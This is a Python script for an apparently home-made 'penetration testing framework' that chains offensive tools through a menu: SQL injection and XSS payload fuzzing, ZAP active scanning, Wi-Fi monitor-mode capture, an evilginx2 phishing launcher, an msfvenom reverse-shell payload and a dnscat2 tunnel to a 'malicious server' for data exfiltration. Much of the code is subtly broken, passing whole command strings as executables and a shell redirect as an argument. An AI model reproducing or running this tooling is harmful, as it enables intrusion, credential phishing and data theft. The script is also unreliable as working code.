import os
import subprocess
import time
import sys
import asyncio
import aiohttp
import json
from zapv2 import ZAPv2  # OWASP ZAP Python library
import requests
from bs4 import BeautifulSoup

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Banner for the framework
def display_splash_screen():
    splash = """



    """

    print(splash)
    print("PT Framework 41PH4-01\n")

# Tools and their commands
TOOLS = {
    'sqlmap': 'sqlmap --help',
    'xsstrike': 'xsstrike --help',
    'aircrack-ng': 'airmon-ng --help',
    'metasploit': 'msfvenom --help',
    'evilginx2': 'evilginx2 --help',
    'nmap': 'nmap -v',
    'nessus': 'nessus -h',
    'dnscat2': 'dnscat2 --help',
}

# Global settings
TARGET = None
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Tool checking function
def check_tools():
    missing_tools = []
    for tool, command in TOOLS.items():
        if not check_tool(tool):
            missing_tools.append(tool)
    if missing_tools:
        print(f"Warning: Missing tools: {', '.join(missing_tools)}")
    else:
        print("All tools are installed and ready!")

# Website testing using OWASP ZAP for vulnerabilities
zap = ZAPv2()

def scan_forms(url):
    print(f"[*] Scanning forms and hidden fields on {url} using OWASP ZAP...")
    
    zap.spider.scan(url)
    while int(zap.spider.status()) < 100:
        print(f"[*] Spidering: {zap.spider.status()}% complete...")
    
    print("[*] Spidering complete. Scanning for vulnerabilities...")
    zap.ascan.scan(url)
    
    while int(zap.ascan.status()) < 100:
        print(f"[*] Active scanning: {zap.ascan.status()}% complete...")

    print("[*] Active scanning complete. Checking findings...")
    
    alerts = zap.core.alerts(baseurl=url, start=0, count=10)
    for alert in alerts:
        print(f"Alert: {alert['alert']} - Risk: {alert['risk']}")
    
    print("[*] Vulnerability scanning complete.")

def log_report(report_file, message):
    with open(report_file, "a") as f:
        f.write(message + "\n")
        print(message)

def test_form_fields(url, report_file):
    print(f"[*] Testing form fields on {url} for injection attacks...")
    
    payloads = ["' OR 1=1 --", "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    
    response = requests.get(url)
    form_fields = extract_form_fields(response.text)
    
    for field in form_fields:
        for payload in payloads:
            print(f"[*] Testing {field} with payload: {payload}")
            data = {field: payload}
            response = requests.post(url, data=data)
            
            if "error" in response.text or payload in response.text:
                log_report(report_file, f"Injection vulnerability found in {field} using payload: {payload}")

def extract_form_fields(page_source):
    soup = BeautifulSoup(page_source, 'html.parser')
    form_fields = [input.get('name') for input in soup.find_all('input') if input.get('name')]
    return form_fields

def website_vulnerability_testing():
    print("\n[+] Website Vulnerability Testing")
    print("1. SQL Injection")
    print("2. XSS Testing")
    print("3. OWASP Top 10 Testing (Forms & Hidden Fields)")
    print("4. Go Back")
    
    choice = input("Select an option: ")
    if choice == '1':
        url = input("[*] Enter the URL for SQL Injection testing: ")
        sql_injection(url)
    elif choice == '2':
        url = input("[*] Enter the URL for XSS testing: ")
        test_xss(url)
    elif choice == '3':
        url = input("[*] Enter the URL for OWASP Top 10 testing: ")
        report_file = "penetration_testing_report.txt"
        scan_forms(url)
    elif choice == '4':
        return
    else:
        print("Invalid choice. Please select a valid option.")

def phishing_campaign():
    print("[*] Starting Phishing Campaign with Evilginx2...")
    subprocess.run(["evilginx2", "launch"])

def sql_injection(url):
    print(f"[*] Running SQL Injection Test on {url}")
    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])

def test_xss(url):
    print(f"[*] Running XSS Testing on {url}")
    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])

def network_scan(target):
    print(f"[*] Running Network Scan on {target}")
    subprocess.run([TOOLS['nmap'], target])

def wifi_attack(interface):
    print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airodump-ng", interface])

def metasploit_payload():
    print("[*] Generating Metasploit payload...")
    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def get_subdomains(domain):
    subdomains = set()
    urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://api.hackertarget.com/hostsearch/?q={domain}"
    ]
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in urls]
        responses = await asyncio.gather(*tasks)

        for response in responses:
            if response.startswith('['):  
                json_response = json.loads(response)
                for item in json_response:
                    subdomains.add(item['name_value'])
            else:  
                lines = response.split('\n')
                for line in lines:
                    if line:
                        subdomains.add(line.split(',')[0])

    return list(subdomains)

def subdomain_enum(domain):
    print(f"[*] Enumerating subdomains for {domain}...")
    subdomains = asyncio.run(get_subdomains(domain))
    print(f"Found subdomains: {subdomains}")

def dns_tunneling():
    print("[*] Starting DNS Tunneling for Data Exfiltration...")
    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])

def log_results(report_file, message):
    with open(report_file, "a") as file:
        file.write(message + "\n")
        print(message)

def main():
    display_splash_screen()
    check_tools()

    print("[*] Welcome to the Complete Penetration Testing Framework!")
    print("[*] Please choose an option:")
    print("1. Website Vulnerability Testing")
    print("2. Wi-Fi Cracking")
    print("3. Subdomain Enumeration")
    print("4. Network Scanning")
    print("5. Exit")

    choice = input("Enter your choice: ")

    if choice == "1":
        website_vulnerability_testing()
    elif choice == "2":
        interface = input("[*] Enter interface for Wi-Fi deauth (e.g., wlan0): ")
        wifi_attack(interface)
    elif choice == "3":
        domain = input("[*] Enter domain for subdomain enumeration: ")
        subdomain_enum(domain)
    elif choice == "4":
        target_ip = input("[*] Enter target IP for Nmap scan: ")
        network_scan(target_ip)
    elif choice == "5":
        print("[*] Exiting...")
        exit()
    else:
        print("[!] Invalid choice!")

if __name__ == "__main__":
    main()
